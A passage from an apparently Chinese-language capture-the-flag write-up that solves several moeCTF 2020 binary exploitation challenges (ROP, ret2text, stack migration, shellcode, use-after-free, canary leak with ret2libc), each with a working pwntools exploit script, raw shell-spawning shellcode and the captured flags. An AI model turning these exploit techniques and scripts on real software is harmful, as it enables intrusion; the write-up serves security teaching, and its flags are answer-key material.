target_addr</span><br></pre></td></tr></table></figure><p>然后我们就应该开始寻找需要用的<strong>gadget（程序小片段）</strong>了</p><p>一般来说只要找到<code>system(&quot;/bin/sh&quot;)</code>就可以getshell了</p><p>然而我们不难看出，程序中虽然存在着system函数，但是却是<code>system(&quot;eqqie&quot;)</code>。。。</p><p><img src="https://i.loli.net/2020/08/06/ZGdgYATBi8L2fwm.png" alt="image.png"></p><p>因此很明显我们不能直接返回到这个函数的地址上</p><p>但是这也告诉我们有<code>system函数</code>的gadget，接下来只需要再找到<code>/bin/sh</code>字符串就可以凑出<code>system(&#39;/bin/sh&#39;)</code></p><p>我们很容易在<code>.data</code>段找到<code>&quot;/bin/sh&quot;</code></p><p><img src="https://i.loli.net/2020/08/06/8jlm6eZaWA1uMx5.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/06/IvTARLHcFo97XyS.png" alt="image.png"></p><p>与32位程序所不同的是，64位程序参数<strong>首先通过rdi,rsi,rdx,rcx,r8,r9这六个寄存器进行传递</strong></p><p>那么我们只需要先在<code>rdi寄存器</code>内写入<code>&quot;/bin/sh&quot;</code>的地址再调用system函数即可getshell</p><p>但是我们直接找似乎找不到<code>pop rdi</code></p><p>别慌www，在IDA内我们可以找到一段指令是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop r15</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/06/BgKRwnzp5yTH7l8.png" alt="image.png"></p><p>按下<code>D</code>展开变成数据</p><p><img src="https://i.loli.net/2020/08/06/XFxkV5w7uSKMmRG.png" alt="image.png"></p><p>再按下<code>C</code>变成指令</p><p><img src="https://i.loli.net/2020/08/06/MK2JW16oy3Db8FB.png" alt="image.png"></p><p>得到指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>于是我们就成功得到了<strong>改变rdi寄存器的gadget的地址</strong></p><p>接下来我们就可以构造payload了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'rop1'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10004)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = p64(<span class="number">0x400933</span>)</span><br><span class="line">sh_addr = p64(<span class="number">0x601070</span>)</span><br><span class="line">call_sys = p64(<span class="number">0x4007df</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">136</span> + pop_rdi + sh_addr + call_sys</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>连接服务器，使用我们的payload来getshell</p><p><img src="https://i.loli.net/2020/08/06/yPLIicR9daTVWB8.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/06/1fT5rBh23v6sayX.png" alt="image.png"></p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;67d14388-9052-4182-869c-5e5f0cdac4e5&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注：也可以使用工具<code>ROPgadget</code>来寻找gadget</p><p>Linux下，上面寻找gadget的步骤也可以如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary rop1 --string <span class="string">'/bin/sh'</span></span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/06/XOmzb8AWo92nvBi.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary rop1 --only <span class="string">'pop|ret'</span></span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/08/06/tLToxVk8Cz19ARP.png" alt="image.png"></p></blockquote><blockquote><p>参考资料：<a href="https://www.cnblogs.com/ichunqiu/p/9288935.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/9288935.html</a></p></blockquote><h2 id="ROP2-ret2text"><a href="#ROP2-ret2text" class="headerlink" title="ROP2 - ret2text"></a>ROP2 - ret2text</h2><p> <a href="/download/moectf2020/pwn/rop2/rop2"点击此处下载原题"">点击下载-rop2</a> </p><p>首先使用<code>checksec</code>指令，发现其存在<strong>栈不可执行保护</strong></p><p><img src="https://i.loli.net/2020/08/06/HDUg72BPC94AzJO.png" alt="image.png"></p><p>拖进IDA，我们可以看到这一题和ROP1基本上没有太大的不同，都是直接存在gets函数的溢出漏洞</p><p><img src="https://i.loli.net/2020/08/06/CYwqLfMRsyBxHK1.png" alt="image.png"></p><p>以及<code>system</code>函数的gadget和<code>pop rdi</code>的gadget</p><p><img src="https://i.loli.net/2020/08/06/tHY6GJM3NWE8jUk.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/06/mLMFVgjHt5DzBas.png" alt="image.png"></p><p>不同的是，这一次并没有给我们预留下可以利用的<code>&quot;/bin/sh&quot;</code>字符串</p><p><img src="https://i.loli.net/2020/08/06/BsmoxyjT8bOnvuh.png" alt="image.png"></p><p>那么我们是否可以手动读入<code>/bin/sh</code>字符串呢？答案是肯定的</p><p>首先存在<code>gets()</code>函数可以读入字符串</p><p><img src="https://i.loli.net/2020/08/09/vxIF8c1b4ATqtQW.png" alt="image.png"></p><p>其次我们在IDA中按下<code>CTRL + S</code>，可以看到存在一个可以供我们读写的<code>.bss</code>段</p><p><img src="https://i.loli.net/2020/08/09/hdC8S9FJGPBUbQl.png" alt="image.png"></p><p>那么我们只需要将<code>/bin/sh</code>字符串读到这个段上，再将之作为<code>system</code>函数的参数即可<code>getshell</code></p><p>那么我们可以构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">'rop2'</span>)</span><br><span class="line">gets_addr = p64(e.symbols[<span class="string">'gets'</span>])</span><br><span class="line">sys_addr = p64(e.symbols[<span class="string">'system'</span>])</span><br><span class="line">pop_rdi = p64(<span class="number">0x400933</span>)</span><br><span class="line">bss_addr = p64(<span class="number">0x601080</span>)<span class="comment">#也可以用 e.bss() 快速获取可读写.bss段地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">136</span> + pop_rdi + bss_addr + gets_addr + pop_rdi + bss_addr + sys_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'rop2'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10005)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>连接服务器，发送我们的payload，即可getshell</p><p><img src="https://i.loli.net/2020/08/09/fIoZyxE7F5biUQz.png" alt="image.png"></p><p>得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;d44bc3cb-471b-4906-822b-ea5cb32c4acb&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Tips:</p><p>pwntools里的ELF模块可以帮助我们快速找到一些需要的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#basic usage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">'file_name'</span>)<span class="comment"># name of the file you're going to pwn</span></span><br><span class="line"></span><br><span class="line">e.symbols[<span class="string">'func_name'</span>]<span class="comment"># to get the address of function-calling instruction quickly</span></span><br><span class="line"></span><br><span class="line">e.bss()<span class="comment"># to get the address of a readable and writable </span></span><br><span class="line"><span class="comment"># bss address quickly</span></span><br><span class="line"></span><br><span class="line">e.plt[<span class="string">'func_name'</span>]<span class="comment"># to get the address of function-calling instruction</span></span><br><span class="line"><span class="comment"># of function in .plt table quickly</span></span><br><span class="line"><span class="comment"># usually the same result with symbol['f_name']</span></span><br><span class="line">        </span><br><span class="line">e.got[<span class="string">'func_name'</span>]<span class="comment"># similar with the former one, which used to get .got table</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="baby-migration-stack-migration-ret2shellcode"><a href="#baby-migration-stack-migration-ret2shellcode" class="headerlink" title="baby migration - stack migration + ret2shellcode"></a>baby migration - stack migration + ret2shellcode</h2><p> <a href="/download/moectf2020/pwn/baby_migration/baby_migration">点击下载-baby_migration</a> </p><p>首先是惯例的<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/24/4HjdZqlBKp1fIrG.png" alt="image.png"></p><p>四舍五入保护全关</p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/08/24/vf4jkEraNHWARhq.png" alt="image.png"></p><p>我们可以看到存在栈溢出，可供溢出字节为<code>66-0x30=18</code>个字节，也就是说基本上只够覆盖rbp（8字节）+返回地址（8字节），空间十分拥挤，同时程序里也没有能够直接利用的gadget</p><p>但是我们可以观察到在<code>bss段</code>有极大的可读写空间</p><p><img src="https://i.loli.net/2020/08/24/1Id5CqOT92ui4ZH.png" alt="image.png"></p><p>故考虑<strong>栈迁移</strong>，将栈迁移到bss段再放上我们的shellcode</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x30</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">back_to_gets = <span class="number">0x4011c8</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line">payload1 = <span class="string">b'A'</span>*offset + p64(bss+<span class="number">500</span>) + p64(back_to_gets)</span><br><span class="line">payload2 = sc + <span class="string">b'A'</span>*(offset - len(sc)) + p64(bss+<span class="number">500</span>) + p64(bss+<span class="number">500</span>-offset)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./baby_migration'</span>)<span class="comment">#p = remote('sec.arttnba3.cn', 10002)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行脚本即得flag</p><p><img src="https://i.loli.net/2020/08/24/gY1Fxk7GERTjSBr.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;5tack_m1gr@ti0n_1s_e4sy!&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以下内容来自<a href="https://arttnba3.cn" target="_blank" rel="noopener">arttnba3.cn</a>：</p><p>如何将一个栈劫持到别的地方？栈迁移的运行原理究竟是？</p><p>做了那么多的pwn题（<del>指moeCTF2020刚刚开始做</del>（👈把这个家伙拖出去🔨了）），我们都知道在构造栈溢出的rop链时不仅要算上栈原本所分配的空间的大小，还要算上<code>ebp/rbp</code>寄存器所占用的4/8个字节，之后才到函数的返回地址，这是因为在一个函数启动时，会先将ebp/rbp的值压入栈中，之后将指向栈顶的esp/rsp寄存器的值赋给ebp/rbp寄存器，随后通过ebp/rbp寄存器来实现对栈的访问</p><p><img src="https://i.loli.net/2020/08/24/U8f5Y1CJrsdVT69.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/24/jQkcHxb5MgARspU.png" alt="image.png"></p><p>同样的，有压栈同样就会有出栈来恢复ebp/rbp与esp/rsp的值，我们都知道在函数运行到末尾时，会执行<code>leave</code>，<code>retn</code>两条指令</p><p><img src="https://i.loli.net/2020/08/24/v79Elx15bWXdyoZ.png" alt="image.png"></p><p>其中<code>leave</code>指令便是用来恢复栈帧的指令，它等价于如下指令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;ebp &amp; esp in 32-bit</span><br><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure><p>由于<strong>对栈的访问都是通过ebp/rbp进行的</strong>，那么我们不难想到，只要我们在溢出时<strong>覆写掉栈内储存的原ebp/rbp的值</strong>，<strong>在retn指令返回后程序所判定的栈基址其实就变成了我们所覆写上的那个地址</strong>，之后程序在调用栈上的变量的时候其实都是基于我们所覆写上的新的栈基址进行操作的了，相当于把栈劫持到另一个地方，所以又叫<strong>栈劫持</strong></p></blockquote><h2 id="Hard-shellcode-ret2shellcode"><a href="#Hard-shellcode-ret2shellcode" class="headerlink" title="Hard shellcode - ret2shellcode"></a>Hard shellcode - ret2shellcode</h2><p> <a href="/download/moectf2020/pwn/hard_shellcode/hard_shellcode"点击此处下载原题"">点击下载-hard_shellcode</a> </p><p>首先是惯例的<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/09/hkzgUZj8rYPoFI3.png" alt="image.png"></p><p>保护全关，似乎整挺好</p><p>不过这题的分值比rop2还要高100分，小心为妙XD</p><p>拖入IDA看看</p><p><img src="https://i.loli.net/2020/08/09/GdmDsjEnXpBqobO.png" alt="image.png"></p><p>我们可以看到，读入0x50个字节，buf大小为0x40，<strong>存在栈溢出</strong></p><p><strong>但是溢出大小只有0x10个字节，甚至无法放下一段完整的能用以getshell的shellcode，算上覆盖掉RBP的八个字节，返回地址的八个字节后，我们一无所有XD</strong></p><p>还是看看有没有什么可以利用的gadget吧XD</p><p>我们不难找到在IDA中直接有一段代码标注着<code>_gadget</code>，看得出来这段代码很想被我们利用www（</p><p><img src="https://i.loli.net/2020/08/09/FidYB2N85WspeDt.png" alt="image.png"></p><blockquote><p>注：找寻可利用的gadget也可以用工具ROPgadget，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ROPgadget --binary hard_shellcode --ropchain</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/08/09/zw9PxaDdpCf4h5B.png" alt="image.png" style="zoom: 50%;" /></blockquote><p>我们不难想到，当我们输入完0x50个字节时，程序运行到返回地址返回到某个代码段后，rsp指向返回地址的高一个字节</p><p>若是返回至gadget：0x4000ea：</p><p>执行push rbp后，<strong>rsp = 原rsp - 8</strong></p><p>执行mov rbp, rsp; sub rsp, 8后， <strong>rsp = 原rsp-16</strong></p><p>执行jmp rsp后<strong>程序会尝试执行rsp上的代码，即原rsp-16位置上的代码</strong></p><p>这个位置便是我们<strong>输入时所覆盖掉的RBP的位置</strong></p><p>那么我们在这个位置上<strong>便有8个字节的空间可以写上我们的shellcode</strong></p><p>同时我们想到，<strong>前面还有64个字节的空间，完全可以装得下一段getshell的shellcode</strong></p><p>我们只需要先在前面写上getshell，<strong>再在8个字节的空间中写入修改rsp的值并再次跳转至rsp即可getshell（rsp与我们的输入的偏移量是可知的）</strong></p><p>故得exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">sub_rsp = asm(<span class="string">'sub rsp, 64'</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">'jmp rsp'</span>)</span><br><span class="line"></span><br><span class="line">gadget_addr = p64(<span class="number">0x4000ea</span>)</span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">b'A'</span>*(<span class="number">64</span>-len(sc)) + sub_rsp + jmp_rsp + <span class="string">b'A'</span>*(<span class="number">8</span>-len(sub_rsp)-len(jmp_rsp)) + gadget_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'hard_shellcode'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10002)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>向服务器发送payload，成功getsgell</p><p><img src="https://i.loli.net/2020/08/09/QwGlAhc5fd9rItp.png" alt="image.png"></p><p>得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Ni_HA0_q1ang_a!&#125;</span><br></pre></td></tr></table></figure><h2 id="easycpp（已下线）-Use-After-Free"><a href="#easycpp（已下线）-Use-After-Free" class="headerlink" title="easycpp（已下线） - Use After Free"></a>easycpp（已下线） - Use After Free</h2><blockquote><p>注：本题因为一些原因在比赛过程中下线了</p></blockquote><p> <a href="/download/minil/pwn/easycpp"点击此处下载原题"">点击下载-easycpp</a><br> <a href="/download/minil/pwn/libc.so.6"点击此处下载原题"">点击下载-libc.so.6</a> </p><p>首先是惯例的<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/09/tpZQ1nE5oaGdsRX.png" alt="image.png"></p><p>我们可以看到，和前面几题不同的是这个程序是一个32位的程序</p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p><p>用到了一个名为<code>B</code>的类，我们先看看这个类都有些啥</p><p>IDA中类B有一个构造函数<code>B()</code>和一个<code>print()</code>函数</p><p><img src="https://i.loli.net/2020/08/09/oIvaelmuFLr24JY.png" alt="image.png"></p><p>类B的构造函数如下：</p><p><img src="https://i.loli.net/2020/08/09/s1t4V8f7k9JvLQT.png" alt="image.png"></p><p>类B的构造函数首先调用了类A的构造函数，然后将变量_vptr_A设置为一个函数指针</p><p>我们不难看到在0x80489E4位置上我们还需要再跳转一次到0x80488F2的位置，这个位置上有一个<code>B::print()</code>函数，故可知这是一个<strong>二级函数指针</strong></p><p><img src="https://i.loli.net/2020/08/09/k7gyPQfNmvLeJCn.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/09/7ILSlb95q12Dfny.png" alt="image.png"></p><p>我们再来看看类A的构造函数，如下：</p><img src="https://i.loli.net/2020/08/09/thgBiFQcLl86mru.png" alt="image.png" style="zoom:50%;" /><p>类A的构造函数也是将变量<code>_vptr_A</code>设置为一个函数指针</p><p>位于off_80489F0上的函数为<code>A::print()</code></p><p><img src="https://i.loli.net/2020/08/09/5qF6acIEWUGOvZ7.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/09/NDidotkIqXPuHn7.png" alt="image.png"></p><p>接下来是main函数的简单分析：</p><p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p><p>v3、v4都是一个类型为<code>类 B</code>的指针</p><p>首先<code>setvbuf()</code>函数将程序设置为无缓冲输入</p><p>之后创建了一个类B的实例并将地址给到指针v3和v4</p><p>之后将该实例内的变量<code>_vptr_A</code>的值设为0</p><p>之后使用delete释放掉之前分配给v3、v4的内存</p><p>之后<strong>从标准输入流读入1024个字节到buf</strong>（或许有操作空间？）</p><p>之后调用<code>strbuf()</code>函数重新分配一段内存空间并将buf的值拷贝一份（当然最后并没有指针接收这一块内存，那么它会成为野内存吗？）</p><p>最后<strong>重新调用v4的函数指针变量所指向的函数</strong></p><p>那么我们在这里就可以发现一个漏洞：</p><p>v3、v4所指向的内存空间被释放后v3、v4并没有被设置为NULL，在运行到strdup()函数时若是我们给到buf的输入长度在一定范围内，这一块内存空间会被堆管理器重新分配给strdup()函数，而之后又通过v4再次对这一块内存空间进行调用，很明显存在<strong>UAF（Use After Free）</strong>漏洞</p><p>同时我们可以发现存在一个<code>backdoor()</code>函数直接调用了<code>system(&quot;/bin/sh&quot;)</code>，可以直接getshell</p><p><img src="https://i.loli.net/2020/08/09/dPJUXZ6M9kx8RnN.png" alt="image.png"></p><p>故我们只需要覆写掉函数指针所指的函数为backdoor()函数即可getshell</p><p>构造二级指针的结构应为</p><table><thead><tr><th>buf</th><th>buf+4</th></tr></thead><tbody><tr><td>右边那一块的地址 -&gt;</td><td>指向backdoor函数的地址</td></tr></tbody></table><p>buf的地址如下：</p><img src="https://img-blog.csdnimg.cn/20200809084003820.png" alt="image.png" style="zoom:50%;" /><p>故得exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'easycpp'</span>)<span class="comment">#p = remote('sec.eqqie.cn', 10007)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x80487BB</span></span><br><span class="line">buf = <span class="number">0x804A0C0</span></span><br><span class="line"></span><br><span class="line">payload = p32(buf + <span class="number">4</span>) + p32(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>向服务器发送payload，成功getsgell</p><img src="https://i.loli.net/2020/08/09/eWifdr1K3v8Vxka.png" alt="image.png" style="zoom: 33%;" /><img src="https://i.loli.net/2020/08/09/6nQtRSwIdhX5peB.png" alt="image.png" style="zoom:50%;" /><p>得到flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Ev3ryth1ng_c@n_be_cPP!&#125;</span><br></pre></td></tr></table></figure><blockquote><p>参考资料：</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/" target="_blank" rel="noopener">ctf-wikf:Use After Free</a></p></blockquote><h2 id="baby-canary-canary-partial-overwrite-ret2libc"><a href="#baby-canary-canary-partial-overwrite-ret2libc" class="headerlink" title="baby canary - canary + partial overwrite + ret2libc"></a>baby canary - canary + partial overwrite + ret2libc</h2><p> [点击下载-baby_canary](/download/moectf2020/pwn/baby canary/baby_canary”点击此处下载原题”) </p><p> [点击下载-libc.so.6](/download/moectf2020/pwn/baby canary/libc.so.6”点击此处下载原题”) </p><p>首先是惯例的<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/29/wtnmcLYru4OTdgs.png" alt="image.png"></p><p>除了地址随机化以外都开了，<strong>这也是唯一一道需要我们绕过canary保护的题</strong></p><p>当然，看名字我们就知道这题肯定要考canary（</p><p>首先拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/08/29/lAEmSNwFPbVyfop.png" alt="image.png"></p><p>唯一的一个可塑的输出点是printf，我们考虑构造长度为<code>0x4c-0xc+1</code>的padding<strong>覆写掉canary的最高位字节\x00，这样程序在调用printf函数时便会输出canary的值</strong></p><p>也就是<strong>partial overwrite</strong></p><p>那么我们的第一条payload就出来了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>之后程序在输出完我们的输入之后还会再输出一些东西，而其中的前三个字节便是<strong>canary的低三位字节</strong></p><p>故我们考虑使用以下代码得到canary：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(<span class="string">'\x00'</span>+p.recv(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>得到了canary的值之后我们就可以尽情地溢出了</p><p>同时我们可以发现不存在可以直接getshell的system函数或是/bin/sh字符串</p><p><img src="https://i.loli.net/2020/08/29/ZN8SXe5KECDAnJI.png" alt="image.png"></p><p>题目给出了<code>libc.so.6</code>文件，故考虑<strong>ret2libc</strong>，构造rop链先将函数返回至<code>puts</code>，输出puts函数的真实地址（储存在got表中），之后计算出libc的基址，再计算出libc中system函数与/bin/sh字符串的真实地址，最后构造rop链执行<code>system(&quot;/bin/sh&quot;)</code>即可getshell</p><p>故最终构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'sec.arttnba3.cn'</span>,<span class="number">10003</span>)</span><br><span class="line">e = ELF(<span class="string">'./baby_canary'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">puts_got = e.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>+<span class="number">1</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(<span class="string">b'\x00'</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>) + p32(canary) + <span class="string">b'A'</span>*(<span class="number">0xc</span><span class="number">-4</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(puts_plt)+ p32(e.sym[<span class="string">'main'</span>]) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">'flag!\n'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = p.recv(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">sh_addr = libc_base + libc.search(<span class="string">b'/bin/sh'</span>).__next__()</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">b'A'</span>*(<span class="number">0x4c</span><span class="number">-0xc</span>) + p32(canary) + <span class="string">b'A'</span>*(<span class="number">0xc</span><span class="number">-4</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行exp，成功getshell</p><p><img src="https://i.loli.net/2020/08/29/v7Kau1Bop9rckdU.png" alt="image.png"></p><p>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 